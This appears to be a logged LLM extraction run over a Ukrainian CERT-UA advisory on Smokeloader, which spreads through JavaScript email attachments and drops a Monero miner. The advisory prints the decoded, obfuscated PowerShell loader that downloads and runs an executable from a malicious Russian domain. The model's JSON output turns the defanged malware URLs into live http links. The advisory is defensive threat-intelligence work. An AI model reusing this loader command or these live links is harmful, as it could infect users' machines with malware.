@@ -1,0 +1,121 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is. REUSE a label from the KNOWN KINDS list below whenever one fits; only when nothing fits, write your own phrase (e.g. "hacking group", "malware family", "software vendor"). Use the same phrase for entities of the same kind.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN KINDS ###
+Kinds discovered from previously processed reports (label: definition). Reuse them when they fit.
+- Security Vulnerability: A flaw or weakness in software, hardware, or a system that can be exploited to compromise security. (also: Software Vulnerability, Vulnerability, Common Vulnerabilities and Exposures)
+- Software Product: An application, operating system, or suite of computer programs designed to perform specific tasks or functions. (also: Software, Software Application)
+- Software Vendor: An organization or company that develops, distributes, or maintains software, hardware, or related technology products and services. (also: Technology Vendor, Software Developer, Vendor)
+- Country: A distinct territorial body or sovereign state with its own government and defined geographical borders. (also: Nation, Sovereign State)
+- Government Organization: An official agency, ministry, or administrative body operating as part of a national or state government. (also: Government Agency, Government Body, State Authority)
+- Malware: Malicious software, code, or executables designed to infiltrate, damage, or compromise computer systems and data. (also: Malicious Software, Malware Family, Malware Strain)
+- Uniform Resource Locator: A standardized web address specifying the location and retrieval mechanism of a resource on a computer network. (also: URL, Web Address, Web Link)
+- Person: An individual human being, such as a government official, cybersecurity expert, researcher, or executive. (also: Individual, Natural Person)
+- IP Address: A numerical label assigned to a device connected to a computer network that uses the Internet Protocol for communication. (also: Internet Protocol Address)
+- Email Address: A unique identifier used to send and receive electronic mail messages over a computer network. (also: E-mail Address, Electronic Mail Address)
+
+### KNOWN RELATION TYPES ###
+- publishes-advisory: The subject vendor or organization releases or issues a security advisory or patch update.
+- fixes-vulnerability-in: The subject security advisory or update remediates vulnerabilities found in the object software product.
+- affects: The subject vulnerability or malware impacts, targets, or compromises the object software, system, or organization.
+- located-in: The subject entity is based in, operates within, or belongs to the object country or geographic area.
+- part-of: The head entity is a component, sub-application, or structural member of the tail entity.
+- hosts: The subject network infrastructure, host, or server hosts or provides access to the object resource or payload.
+- delivers: The subject malware, file, or campaign installs, drops, or initiates the execution of the object malware payload.
+- redirects-to: The subject script, webpage, or file redirects user traffic or execution to the object URL or host.
+- exploits: The subject threat actor or malware leverages or abuses the object security vulnerability to compromise systems.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p>Виявлено факт поширення шкідливого програмного забезпечення Smokeloader, який скачував на комп’ютери жертв програму для майнингу криптовалюти Monero.</p><p>&nbsp;</p><p>Поширення Smokeloader відбувається через розсилку поштових повідомлень зі злоякісним Javascript-ом.</p><p>&nbsp;</p><p>Приклад повідомлення з темою «гарантийное письмо»:</p><p></p><p>&nbsp;</p><p>Вміст архіву зі шкідливим&nbsp;Javascript:</p><p></p><p>&nbsp;</p><p>В самому Javascript шкідливий&nbsp;код зашифрований в виді Base64 і при розшифруванні виглядає так:</p><p>cmd /k set _a1=pow&amp;&amp; set _a2=ersh&amp;&amp; set _a3=ell&amp;&amp; call %_a1%%_a2%%_a3%</p><p>$http_request = New-Object -ComObject Msxml2.XMLHTTP;$adodb = New-Object -ComObjectADODB.Stream; $path = $env:temp + '\1964.exe'; $http_request.open('GET', 'http://enterwords.ru/uadoc/crsse.exe', $false);</p><p>$http_request.send();if($http_request.Status -eq"200") {$adodb.open();$adodb.type = 1;$adodb.write($http_request.responseBody);</p><p>$adodb.position = 0;$adodb.savetofile($path); $adodb.close();}else{&nbsp;&nbsp;Write-Host $http_request.statusText; }Start-Process $path;</p><p>&nbsp;</p><p>Він скачує з сайту hXXp://enterwords.ru/uadoc/crsse.exe файл crsse.exe і зберігає його в директорії C:\tmp\1964.exe. Така назва файлу вибрана навмисно, щоб користувач міг сплутати її з процесом csrss.exe (Client/Server Runtime Subsystem).</p><p>&nbsp;</p><p>Crsse.exe це шкідливе&nbsp;програмне забезпечення забезпечення типу&nbsp;Smokeloader. Для унеможливлення його аналізу він має техніки приховування і анти-аналізу. В crsse.exe є безліч непотрібних функцій, які заважають аналізу. Серед них в crsse.exe виділяється пам’ять і записується туди тіло вірусу, куди переходить виконання, проте без заголовка, щоб не можна було його динамічно проаналізувати.</p><p>Перехід виконання в іншу область пам’яті:</p><p></p><p>&nbsp;</p><p>Далі Smokeloader запускає потік, який перевіряє на наявність запущених програм, які використовуються для аналізу шкідливого&nbsp;коду. Якщо вони присутні, він закриває їх. Також, в регістрі (System\\CurrentControlSet\\Services\\ Disk\\Enum) перевіряє чи дана система запущена в віртуальному середовищі і якщо так, то програма переходить до безкінечного циклу сну.</p><p>&nbsp;</p><p>Після цього запускається та інфікується, шкідливим кодом, процес explorer.exe. Він скачує з hXXp://parodadoca.ru/panel/mr/curl.exe файл curl.exe, який є програмою для майнингу криптовалюти Monero.&nbsp;Файл зберігається в директорії: C:\Users\Ім'яКористувача\AppData\Roaming\MicroMon\curl.exe.</p><p>&nbsp;</p><p><strong>Перелік індикаторів компрометації:</strong></p><p><strong>MD5 / Назви файлів:</strong></p><p>b7a59f6868623e0a95eb58a0d09f4810&nbsp;curl.exe</p><p>d7c21ada5b5325e52295a331c6fb53a4&nbsp;Заявка.js</p><p>2c575c6037d4aa5f74a239d6ebf4d381&nbsp;crsse.exe</p><p><strong>Шкідливі файли, які створюються:</strong></p><p>C:\Users\Ім'я Користувача\AppData\Roaming\MicroMon\curl.exe</p><p>C:\tmp\1964.exe</p><p><strong>Шкідливі посилання (Malicious Links):</strong></p><p>hXXp://parodadoca.ru/panel/mr/curl.exe</p><p>hXXp://enterwords.ru/uadoc/crsse.exe</p><p><strong>Корисні посилання:</strong></p><p><a href="https://www.virustotal.com/#/file/fc9a32ecce00b4b2d711fe9bda120c9f82f3c2405f3658d30f4dbdac5cedde26/detection" rel="noopener noreferrer" target="_blank" style="color: rgb(0, 123, 255);">https://www.virustotal.com/#/file/fc9a32ecce00b4b2d711fe9bda120c9f82f3c2405f3658d30f4dbdac5cedde26/detection</a></p><p><a href="https://www.virustotal.com/#/file/d615b44faf43961120df348e687e7f237ca67c4a1050c8d5bdf344495ab26f30/detection" rel="noopener noreferrer" target="_blank" style="color: rgb(0, 123, 255);">https://www.virustotal.com/#/file/d615b44faf43961120df348e687e7f237ca67c4a1050c8d5bdf344495ab26f30/detection</a></p><p><a href="https://www.virustotal.com/#/file/0b1d0bf898aa8a938652c53361b9d87b63d7b7627def44cb8958686fe45def42/detection" rel="noopener noreferrer" target="_blank" style="color: rgb(0, 123, 255);">https://www.virustotal.com/#/file/0b1d0bf898aa8a938652c53361b9d87b63d7b7627def44cb8958686fe45def42/detection</a></p><p>&nbsp;</p><p><strong>Рекомендації CERT—UA:</strong></p><ol><li>Забезпечити неприпустимість відкриття вкладень у підозрілих повідомленнях (у листах від адресантів, щодо яких виникають сумніви, наприклад: автор з невідомих причин змінив мову спілкування; тема листа є нетиповою для автора; спосіб, у який автор звертається до адресата, є нетиповим тощо; а також у повідомленнях з нестандартним текстом, що спонукають до переходу на підозрілі посилання або до відкриття підозрілих файлів – архівів, виконуваних файлів і т.ін.).</li><li>Системним адміністраторам і адміністраторам безпеки звернути увагу на фільтрування вхідних/вихідних інформаційних потоків, зокрема поштовогой веб-трафіку.</li><li>Перевірити наявність отриманих повідомлень клієнтів поштового серверу, для визначення потенційно вражених користувачів.</li><li>Перевірити наявність переходів за посиланнями, які містили шкідливі файли, для визначення потенційно вражених користувачів.</li><li>Провести заходи з виявлення та видалення ШПЗ.</li><li>Оновити антивірусну базу та просканувати потенційно заражені системи.</li></ol><p>&nbsp;</p>
+
+=== RESPONSE (6.0s, in 3551 / out 717 tok, STOP) ===
+Smokeloader malware is distributed via email messages with malicious JavaScript attachments (such as Заявка.js). The JavaScript executes PowerShell commands to download an executable payload crsse.exe (Smokeloader) from http://enterwords.ru/uadoc/crsse.exe. Once executed, Smokeloader injects into explorer.exe and downloads a cryptocurrency miner curl.exe from http://parodadoca.ru/panel/mr/curl.exe to mine Monero.
+
+{
+  "entities": [
+    {
+      "name": "Smokeloader",
+      "kind": "Malware",
+      "gloss": "A modular bot and loader malware family used to deploy secondary malicious payloads."
+    },
+    {
+      "name": "Monero",
+      "kind": "cryptocurrency",
+      "gloss": "A privacy-focused cryptocurrency frequently targeted and mined by unauthorized cryptojacking malware."
+    },
+    {
+      "name": "Заявка.js",
+      "kind": "Malware",
+      "gloss": "A malicious JavaScript file used to execute PowerShell and download the Smokeloader payload."
+    },
+    {
+      "name": "crsse.exe",
+      "kind": "Malware",
+      "gloss": "A malicious executable containing the Smokeloader loader masquerading as a Windows system process."
+    },
+    {
+      "name": "curl.exe",
+      "kind": "Malware",
+      "gloss": "A malicious cryptocurrency mining software payload used to mine Monero on infected hosts."
+    },
+    {
+      "name": "http://enterwords.ru/uadoc/crsse.exe",
+      "kind": "Uniform Resource Locator",
+      "gloss": "A malicious web URL used to host and distribute the Smokeloader executable crsse.exe."
+    },
+    {
+      "name": "http://parodadoca.ru/panel/mr/curl.exe",
+      "kind": "Uniform Resource Locator",
+      "gloss": "A malicious web URL used to host and distribute the Monero cryptocurrency miner curl.exe."
+    }
+  ],
+  "relations": [
+    {
+      "head": "http://enterwords.ru/uadoc/crsse.exe",
+      "type": "hosts",
+      "tail": "crsse.exe",
+      "evidence": "скачує з сайту hXXp://enterwords.ru/uadoc/crsse.exe файл crsse.exe"
+    },
+    {
+      "head": "http://parodadoca.ru/panel/mr/curl.exe",
+      "type": "hosts",
+      "tail": "curl.exe",
+      "evidence": "скачує з hXXp://parodadoca.ru/panel/mr/curl.exe файл curl.exe"
+    },
+    {
+      "head": "Smokeloader",
+      "type": "delivers",
+      "tail": "curl.exe",
+      "evidence": "Smokeloader, який скачував на комп’ютери жертв програму для майнингу"
+    }
+  ],
+  "newRelationTypes": []
+}
